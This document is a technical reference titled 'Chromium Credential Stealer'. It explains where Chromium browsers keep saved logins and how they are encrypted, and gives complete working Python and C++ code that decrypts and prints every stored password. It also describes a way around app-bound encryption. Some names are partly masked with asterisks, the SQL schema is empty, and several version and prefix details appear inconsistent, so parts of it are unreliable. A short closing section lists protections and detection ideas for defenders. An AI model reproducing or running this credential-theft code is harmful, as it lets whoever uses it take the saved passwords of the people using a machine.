## Chromium Credential Stealer — Technical Reference

### 1. Overview

Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi) store saved website credentials in a SQLite database file named `Login Data`. Passwords are encrypted using Windows Data Protection API (DPAPI) prior to version 80, and AES-256-GCM with a derived key from version 80 onward. This document details the full extraction and decryption protocol.

---

### 2. File Locations

| Artifact | Path (Windows) |
|---|---|
| Login Data DB | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| Local State | `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` |
| Encrypted Key (v80+) | Stored inside `Local State` JSON under `os_crypt.encrypted_key` |

> **Note:** Edge uses `%LOCALAPPDATA%\Microsoft\Edge\User Data\`. Brave uses `BraveSoftware\Brave-Browser\User Data\`.

### 3. Database Schema (`Login Data` — SQLite)

```sql
CREATE TABLE logins (

    UNIQUE (origin_url, username_element, username_value, password_element, signon_realm)

```

The field `password_value` is a BLOB containing the encrypted password. The encryption scheme depends on the Chromium version.

### 4. Encryption Schemes by Version

#### 4.1 Pre-Version 80 (DPAPI)

**Method:** Windows DPAPI via `CryptProtectData` / `C**************a`.

**Format:** The BLOB is the direct output of `CryptProtectData()` — no header, no version byte. The decryption key is tied to the user's Windows logon session.

**Decryption (Win32 API):**

```cpp
DATA_BLOB input, output;
input.pbData = encrypted_blob;
input.cbData = encrypted_blob_size;

if (C**************a(&input, NULL, NULL, NULL, NULL, 0, &output)) {
    // output.pbData contains plaintext password (UTF-16)
    wprintf(L"Password: %s\n", (wchar_t*)output.pbData);
    LocalFree(output.pbData);
}
```

**Limitations:**
- Only works on the same machine and same user account.
- No cross-machine portability without the user's DPAPI master key.
- Requires the process to run in the same logon session (or have access to the user's master key file).

---

#### 4.2 Version 80+ (AES-256-GCM)

Chromium introduced the `OSCrypt` interface. On Windows, it uses AES-256-GCM with a 256-bit key.

##### 4.2.1 Key Retrieval

The encryption key is itself encrypted with DPAPI and stored in `Local State`:

**`Local State` JSON structure:**
```json
{
    "os_crypt": {
        "encrypted_key": "RFBBUEkB...base64...",
        "app_bound_encrypted_key": { ... }   // optional, newer versions
    }
}
```

The `encrypted_key` field is:
1. A base64-encoded string (no padding issues).
2. When decoded: first byte is the DPAPI version prefix (`'R'` for `RFBBUEk...` which decodes to a magic header — see below).
3. The decoded blob (minus the 5-byte prefix `DPAPI`) is passed to `C**************a`.

**Key extraction in Python:**
```python
import json, base64, win32crypt

with open("Local State", "r") as f:
    local_state = json.load(f)

enc_key_b64 = local_state["os_crypt"]["encrypted_key"]
enc_key = base64.b64decode(enc_key_b64)

# First 5 bytes are 'DPAPI' magic (or 0x01 0x00 0x00 0x00 in newer builds)
# Remove them to get the DPAPI-encrypted blob
dpapi_encrypted_key = enc_key[5:]

# Decrypt using DPAPI
decrypted_key = win32crypt.C**************a(dpapi_encrypted_key, None, None, None, 0)[1]
# decrypted_key is 256 bits (32 bytes) — the AES key
```

> **Important:** In Chromium 104+, the magic prefix may be a 4-byte version header (`\x01\x00\x00\x00`). Always skip the first 5 bytes for safety — the actual DPAPI blob follows.

##### 4.2.2 Password Decryption

Each `password_value` BLOB for v80+ has the following format:

| Offset | Size | Description |
|---|---|---|
| 0 | 3 bytes | Fixed signature `v10` (0x76 0x31 0x30) |
| 3 | 12 bytes | Nonce (random, unique per entry) |
| 15 | N bytes | Ciphertext (AES-256-GCM encrypted) |
| 15+N | 16 bytes | GCM authentication tag |

**Total length:** 3 + 12 + len(ciphertext) + 16

**Python decryption routine:**
```python
import json, base64, win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def d***********e_password(encrypted_blob, aes_key):
    # Validate signature
    assert encrypted_blob[:3] == b'v10', "Invalid signature"
    
    nonce = encrypted_blob[3:15]
    ciphertext = encrypted_blob[15:-16]
    tag = encrypted_blob[-16:]
    
    # GCM expects nonce (12 bytes) + ciphertext + tag concatenated
    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext + tag, None)
    return plaintext.decode('utf-8')

def get_aes_key(local_state_path):
    with open(local_state_path, "r") as f:
        ls = json.load(f)
    enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
    return win32crypt.C**************a(enc_key[5:], None, None, None, 0)[1]
```

### 5. Complete Extraction Protocol (Python)

```python
import sqlite3, json, base64, os, shutil, tempfile
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

CHROME_PATH = os.path.expanduser(
    "~\\AppData\\Local\\Google\\Chrome\\User Data"
)

def copy_sqlite(db_path):
    """Copy SQLite file to avoid lock errors while Chrome is running."""
    tmp = tempfile.NamedTemporaryFile(delete=False)
    shutil.copy2(db_path, tmp.name)
    return tmp.name

def get_passwords():
    local_state = os.path.join(CHROME_PATH, "Local State")
    login_db = os.path.join(CHROME_PATH, "Default", "Login Data")
    
    # Get AES key (works for v80+)
    aes_key = get_aes_key(local_state)
    
    # Copy DB to avoid lock contention
    db_copy = copy_sqlite(login_db)
    
    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT origin_url, username_value, password_value
        FROM logins
        WHERE blacklisted_by_user = 0
    """)
    
    results = []
    for url, user, pwd_enc in cursor.fetchall():
        if not pwd_enc:
            continue
        try:
            # Try v80+ decryption first
            pwd = d***********e_password(pwd_enc, aes_key)
        except Exception:
            try:
                # Fallback: DPAPI (pre-v80)
                pwd = win32crypt.C**************a(pwd_enc, None, None, None, 0)[1].decode('utf-8')
            except Exception as e:
                pwd = f"<decryption failed: {e}>"
        results.append((url, user, pwd))
    
    conn.close()
    os.unlink(db_copy)
    return results

if __name__ == "__main__":
    for url, user, pwd in get_passwords():
        print(f"URL:    {url}")
        print(f"User:   {user}")
        print(f"Pass:   {pwd}")
        print("-" * 60)
```

### 6. Cross-Platform Considerations

| OS | Encryption Method | Requirements |
|---|---|---|
| **Windows** | DPAPI (key) + AES-256-GCM (passwords) | User logon session, `win32crypt` or direct DPAPI |
| **macOS** | Keychain (via `security` CLI or `keyring` lib) | User session, Keychain access |
| **Linux** | libsecret (D-Bus secret service) or `gnome-keyring` | D-Bus session, `secretstorage` Python lib |
| **ChromeOS** | TPM-backed encryption | System-level key, difficult off-device |

### 7. App-Bound Encryption (Chromium 112+)

Newer Chromium builds (112+) introduced **app-bound encryption** as an additional layer:

- The AES key in `Local State` is bound to the Chrome executable path and signature.
- The `app_bound_encrypted_key` field must also be decrypted and verified.
- A signature check using Chrome's private key (Windows ECDSA) is performed.
- Extraction requires impersonating the Chrome process or bypassing signature validation.

**Simplistic bypass:** If `app_bound_encrypted_key` exists but decryption fails, the system falls back to the standard `encrypted_key` on some versions — but this is being phased out.

### 8. Defensive Measures

**For users/protection:**
- Set a master password (Chromium no longer supports this natively; use third-party password managers instead).
- Use Windows Hello / biometric authentication to gate credential access.
- Regularly clear saved passwords from browser settings.
- Enable screen lock and full-disk encryption (BitLocker).

**For detection (blue team):**
- Monitor for `C**************a` calls from non-browser processes.
- Detect SQLite file reads to `Login Data` by unknown processes.
- Monitor access to `Local State` and `Login Data` via ETW (Event Tracing for Windows) or Sysmon.
- Alert on `LoadLibrary` for `crypt32.dll` combined with SQLite API usage.
